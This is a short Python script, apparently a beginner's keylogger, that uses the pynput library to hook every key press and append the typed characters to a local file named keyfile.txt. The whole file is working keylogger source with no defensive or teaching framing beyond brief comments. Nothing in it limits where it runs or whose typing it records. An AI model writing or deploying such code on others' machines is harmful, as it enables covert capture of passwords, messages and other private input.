#importing module
from pynput import keyboard

#defining our function
def keyPressed(key):
    print(str(key))
    #its going to open up this file, if one isnt there it will create one and the continue to append to the file
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

#main program
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
    